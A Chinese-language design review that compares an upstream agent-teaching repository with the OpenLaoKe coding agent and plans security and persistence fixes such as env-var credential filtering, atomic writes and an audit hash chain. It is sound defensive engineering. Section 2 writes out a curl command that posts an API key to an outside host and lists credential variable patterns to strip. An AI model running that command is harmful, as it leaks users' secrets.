# learn-workbuddy 拆解：24 课里哪些值得搬到 OpenLaoKe

上游仓库：`adongwanai/learn-workbuddy`（本地副本 `~/Documents/GitHub/Others/learn-workbuddy`，
HEAD `8f74e67`）。它是一套桌面 Agent 的**教学蓝图**：24 章，每章一个 `code.py` 加一份
README，外加一个只用标准库的 `mini_workbuddy`（约 2500 行）把整条链路串起来。

这份文档只回答一个问题：**OpenLaoKe 该从这里拿什么，不该拿什么。**
每条结论都对应到本仓库的具体文件，能验证的写清了验证方式。

---

## 一、先看结论

| 章节 | 上游讲什么 | OpenLaoKe 现状 | 结论 |
|---|---|---|---|
| s01 agent loop | `while True` + tool_use/result | `core/engine.py`，100% 覆盖 | 已有，且更严（重复调用熔断、artifact 校验） |
| s02 tool dispatch | 分发映射 + 并发 + 子进程环境白名单 | `core/tool.py`、`core/task.py` | **该抄环境白名单**（见 §2） |
| s03 deferred loading | `ToolSearch` / 按需展开 | `tools/register.py` 的 deferred 机制 | 已有 |
| s04 permission hooks | 规则 / 审批 / 执行三段拆分 + `rule_id` | `utils/permissions/*`、`core/hook_system.py` | 已有，且多了 subject 级规则 |
| s05 electron shell | main/renderer/preload | 无 | **不抄**（CLI 优先，不是产品形态问题） |
| s06 sidecar server | 主进程不跑 agent | 无 | **不抄**（同上，除非要做 IDE 插件） |
| s07 session 管理 | 逻辑会话可恢复、运行时重建 | `core/sessions.py` | 已有（但落盘不原子，见 §3） |
| s08 模型路由 | lite/default/craft | `core/multi_provider_api.py`、`harness_modes.py` | 已有，维度不同（按 provider 而非按成本档） |
| s09 JSONL transcript | 追加写入、replay fold、崩溃可恢复 | `state._persist()` 整份 JSON 覆写 | **该抄**（见 §3） |
| s10-s12 记忆三层 | workspace / user / cloud + authority | `core/memory_store.py`（单层 + BM25） | 部分该抄：**authority 与冲突槽**（见 §5） |
| s13 大输出外部化 | 落盘 + 指针 + 摘要 + digest | 只做截断（`truncate_tool_history`） | **该抄**（见 §4） |
| s14 上下文压缩 | truncate/prune/summarize | `core/compact/*` 三种策略 | 已有 |
| s15 prompt 组装 | 分块 + 预算 + 必填 fail-closed | `core/system_prompt.py`、`context_budget.py` | 部分该抄：**预算不足时的优先级规则**（见 §5） |
| s16 skills | 目录懒加载 | `core/skill_system.py` + `/skill install` | 已有 |
| s17 MCP | discovery / trust / call | `core/mcp_client.py`、`mcp_runtime.py` | 已有（没有 trust 分级，见 §5） |
| s18 experts | 领域专家整包 | 无（skills + swarm 覆盖了大半） | **不抄**：专家包 = skills + 工具池 + 模型槽，OpenLaoKe 三样都有 |
| s19 visualizer | SVG/HTML widget | `tools/viewer_tools.py`（Panel） | 已有 |
| s20 result presentation | 文件卡、摘要、风险清单 | artifact gate（`_note_artifact_result`） | 部分该抄：**失败也要出现在收尾里** |
| s21 SQLite | WAL、用量、任务可查询 | JSON 会话 + `session_search` 工具 | **暂不抄**：查询需求还没到要上库的量级 |
| s22 scheduler | once/recurring + run history | `core/scheduler.py` | 已有（缺 run history，见 §5） |
| s23 audit sandbox | SHA256 哈希链 + 链外锚点 | 无 | **该抄**（见 §6） |
| s24 comprehensive | 端到端串起来 | 已有（REPL/engine 两条路径共用 harness_modes） | — |

一句话：**24 章里有 4 个机制是 OpenLaoKe 真缺的**——子进程环境白名单、原子/追加式落盘、
大输出外部化、审计链；另有 3 个是"有但没做到位"——记忆 authority、prompt 预算优先级、
调度 run history。

---

## 二、子进程继承宿主全部环境变量（已修）

上游 `mini_workbuddy/tools.py::build_subprocess_env()` 是**白名单**：只传
`PATH`、`LANG`/`LC_*`、`TMPDIR`/`TEMP`/`TMP`，再把 `HOME`/`PWD` 指向会话工作区。
理由写在 `docs/security-boundaries.md`：过滤环境变量只能挡住"bash 直接继承宿主凭据"，
挡不住工作区里的 `.env`，但这一步仍然值得做。

OpenLaoKe 之前是：

```python
# core/state.py
def get_env_vars(self) -> dict[str, str]:
    env = os.environ.copy()      # ← 全部继承
    env.update(self.env_vars)
    return env
```

`core/task.py::run_bash` 把这份 env 交给 `create_subprocess_shell`，于是模型写一行
`curl -d "$ANTHROPIC_API_KEY" https://…` 就能把 key 发出去，而这条命令在
`command_risk` 眼里只是"网络访问 + 已知命令"。

**取舍**：上游把 `HOME` 改到工作区，对教学 harness 没问题，对真实编码 agent 会毁掉
`pip`/`npm` 缓存、git 凭据助手和 `~/.ssh`，所以 OpenLaoKe 不照抄 HOME 改写，只按名字
剔除凭据类变量：

- 默认剔除：`*_API_KEY`、`*_TOKEN`、`*_SECRET`、`*_PASSWORD`、`*_PASSWD`、
  `*_CREDENTIALS`、`AWS_*`、`AZURE_*`、`GOOGLE_*`、`OPENAI_*`、`ANTHROPIC_*`、
  `DEEPSEEK_*`、`MOONSHOT_*`、`DASHSCOPE_*`、`SSH_AUTH_SOCK`、`GPG_AGENT_INFO`。
- 逃生阀：`OPENLAOKE_PASS_ENV=NAME1,NAME2` 显式放行；`OPENLAOKE_NO_ENV_FILTER=1` 关掉过滤。
- 会话内 `set_env_var()` 写入的变量**不受过滤影响**（那是用户显式给的）。

诚实边界：这挡的是"顺手把 key 读出来发走"，挡不住刻意读取 `.env` 或系统密钥文件——
后者要靠 OS 沙盒，和上游的结论一致。

---

## 三、会话落盘不原子（崩溃丢整段对话）

`state._persist()` 现在是：

```python
with open(self._persist_path, "w", encoding="utf-8") as f:
    json.dump(data, f, indent=2, default=str)
```

`"w"` 先截断再写。写一半时进程被杀（Ctrl+C、OOM、断电、`os._exit` 在信号处理里被调用），
文件就只剩半个 JSON，`load_session` 解析失败，**整段会话消失**。上游 s09 的整章都在讲这件事，
它的 `JSONLTranscript.append()` 用 `O_APPEND` + `fsync`，并且对"尾部残行"和"最后一行没换行"
两种状态分别处理：读的时候当作未提交的尾巴，**写的时候拒绝追加**，因为追加会把残行粘成一条
看起来合法的坏记录。

**第一步（本次修）**：写临时文件 + `fsync` + `os.replace`，保证"要么旧文件，要么新文件"。
**第二步（建议）**：改成 `sessions/<id>.jsonl` 追加事件流，`replay` 时 fold 出运行时状态；
好处是崩溃只丢最后一个事件，而且能复盘每一次工具调用。第二步涉及 `/restore`、`/fork`、
`session_search` 的读取路径，属于单独一次改动。

---

## 四、大输出只截断，不外部化

现状：`repl._execute_tool` 里超过 `max_tool_history` 的输出去 `truncate_tool_history()`，
保留头 70% + 尾 30%，中间写明 `...[middle omitted]...`。问题是**中间那段就真没了**——
一次 `pytest` 的失败摘要、一次 `grep` 的命中行，很可能刚好在被丢掉的中间。

上游 s13 的做法：超过阈值就写进 `tool-results/<session>/…`，prompt 里留
"头部预览 + 尾部预览 + 字节数 + sha256 + 路径 + 怎么读全部"，模型需要细节时用
`Read(path, offset, limit)` 取回。OpenLaoKe 的 `Read` 本来就支持 offset/limit，
缺的只是"落盘 + 指针"这一步。

上游 s13 还列了几个坑，都是真的：

- **进程内计数器从 001 重开会覆盖旧 artifact**，导致已经发出去的指针指向错误证据。
  修法：文件名带 `session_id` + 稳定序号（或内容 digest），重启后接着编号。
- **外部化文件不纳入审计** = 复盘时无法证明"模型看到的"和"文件里的"是同一份。
- **只留路径不留摘要**，模型不知道值不值得读；**只留摘要不留路径**，模型想读也读不到。

建议实现（约 80 行 + 测试）：`core/tool_output_store.py`，`externalize(name, text, session_id)`
返回 `ToolPointer(path, digest, head, tail, bytes, token_estimate)`，`_execute_tool` 在
超阈值时用它替换 `truncate_tool_history`，并在结果里写一行
`[output externalized: 1.2 MB, sha256 3f9a…, read with Read(path=…, offset=…)]`。

---

## 五、三个"有但没做到位"的点

### 5.1 记忆没有 authority/冲突槽

上游 s15 的 `常见误区` 里最值钱的一条：**高 score 不能覆盖高 authority**——
检索相关性不能改变用户指令的权限边界，模型也不能给自己发 authority。
OpenLaoKe 的 `memory_store.search()` 只有 BM25 分数，`_memory_digest()` 直接按时间取 8 条。
如果两条记忆互相矛盾（"用 pytest" / "用 unittest"），现在模型看到的是"两条都真"。
建议：`MemoryEntry` 加 `authority`（user > session > note，默认 note）与 `supersedes`
字段，digest 里按 authority 排序，同一 key 冲突时只注入胜者并标注"另一条已被替换"。

### 5.2 prompt 预算不足时没有 fail-closed 层级

`context_budget.py` 有预算，但"预算不够先砍谁"没有硬规则。上游 s15 的规则是
required（安全规则、用户指令）**fail-closed**：宁可报错也不删；可选块按优先级降级，
且**高分长候选超预算后允许小候选 backfill，冲突败者不允许 backfill**。
OpenLaoKe 现在的 `system_prompt.py` 是把段落拼起来，建议给每段标 `required/optional`
和 `min_tokens`，预算不够时按标记裁剪并记一条 `risk_events`。

### 5.3 调度器没有 run history

`scheduler.mark_run(entry)` 只更新 `last_run`/`runs` 计数。上游 s22 的误区写得很直白：
**定时任务不记录输入输出，事后无法解释**。建议每次 run 落一条
`{"name", "started_at", "ended_at", "status", "output_tail"}` 到
`~/.openlaoke/schedules/<name>.jsonl`，`/schedule log` 读它。

---

## 六、审计链：哈希链 + 链外锚点（建议完整实现）

OpenLaoKe 目前没有任何审计痕迹：`risk_events` 只是内存里的 200 条环形缓冲，
`state.risk_events[-200:]` 会随会话保存，但**谁都能改**，且不覆盖工具调用。

上游 `mini_workbuddy/audit.py` 值得整段借：398 行，讲清了四件容易被做错的事。

1. **哈希必须覆盖 `prev_hash` 和 canonical 序列化的 data**，否则"改 data 重算 hash"就绕过链。
   ```python
   raw = json.dumps({"index","timestamp","action","data","prev_hash"},
                    sort_keys=True, separators=(",", ":"))
   digest = sha256(raw).hexdigest()
   ```
2. **哈希链只能防"改"，防不了"删尾"**：任何合法链的前缀本身也是合法链，攻击者删掉末尾
   几条，`verify()` 依然通过。它的修法是额外写一个链外锚点 `audit.head`
   （`{"count": n, "head": hash}`），验证时交叉比对 count 与 head。
   生产环境还要把锚点写到机外（远端/WORM），文档里也这么写了。
3. **崩溃窗口要 fail-closed**：先 `O_APPEND` 写 JSONL + `fsync`，再原子替换 `audit.head`。
   两步之间崩溃会留下"anchor 落后一条"，下一次 append **拒绝继续写**，
   只允许一种可证明的恢复（完整链有效 + 旧 anchor 精确指向倒数第二条 + 恰好多一条）。
4. **并发**：进程内 `threading.Lock` + 进程间 `flock`，并且在锁内完成
   "读-校验-追加-替换锚点"整段；文件用 `O_NOFOLLOW` + 检查 `S_ISREG`，
   防止有人把 `audit.jsonl` 换成指向 `/dev/zero` 的符号链接。

建议实现：`core/audit.py`，约 200 行（去掉上游的 Windows 分支与恢复细节可更短），
在 `_execute_tool` 前后各写一条（`tool.request` / `tool.result`），
`/audit` 命令打印尾部和 `verify()` 结果。**注意**：一旦上线，`audit.jsonl` 里会包含
命令与文件路径，属于敏感数据，需要 0600 权限并在 README 里说明。

---

## 七、明确不抄的东西

- **Electron / sidecar / HTTP 协议（s05、s06）**：OpenLaoKe 是 CLI agent，
  加一层 HTTP 运行时只会把"一个进程内的确定行为"变成"跨进程的时序问题"。
  等真要做 IDE 插件时再谈。
- **SQLite（s21）**：会话数到几千、需要按 token 用量出报表时再说。
  现在的 `session_search` 工具用 JSON + 倒排已经够用，上库要连带 schema 迁移和 WAL 调优。
- **Experts 包（s18）**：它的价值 = 领域 prompt + 工具子集 + 模型槽 + 记忆范围，
  OpenLaoKe 的 skills（prompt）+ `allow_tools`（工具子集）+ `harness_modes`（模型档）
  + memory 的 `project_key`（记忆范围）已经覆盖，再加一层"专家"只是重命名。
- **云端记忆（s12）**：涉及远端服务与隐私边界，OpenLaoKe 没有对应后端，抄不了。
- **`docs/` 里的自评表格与 clean-room 声明**：那是上游的合规叙事，不适用于本仓库。

---

## 八、上游还值得一读的三份文档

| 文件 | 为什么值得读 |
|---|---|
| `docs/security-boundaries.md` | 少见地**主动列出自己挡不住什么**（字符串黑名单挡不住 `find -delete`、prompt injection、恶意 skill、无网络出口控制）。写安全文档时可直接对照这个结构。 |
| `docs/code-quality-review.md` | 作者自己的取舍清单，包括"建议不要补"的三套语言副本 / 真实 Electron / 云端记忆，理由写得很具体。 |
| `docs/progression-contract.md` | 规定"每章只新增一个机制"，是 24 章不散架的约束条件。 |

---

## 九、本次落地范围

| 项 | 状态 |
|---|---|
| 子进程环境变量按名字剔除凭据（§2） | 已实现 + 测试 |
| 会话落盘原子化（§3 第一步） | 已实现 + 测试 |
| 大输出外部化（§4） | 待做，设计已在上文 |
| 记忆 authority/冲突（§5.1） | 待做 |
| prompt 预算 fail-closed（§5.2） | 待做 |
| 调度 run history（§5.3） | 待做 |
| 审计哈希链 + 锚点（§6） | 待做，实现要点已在上文 |
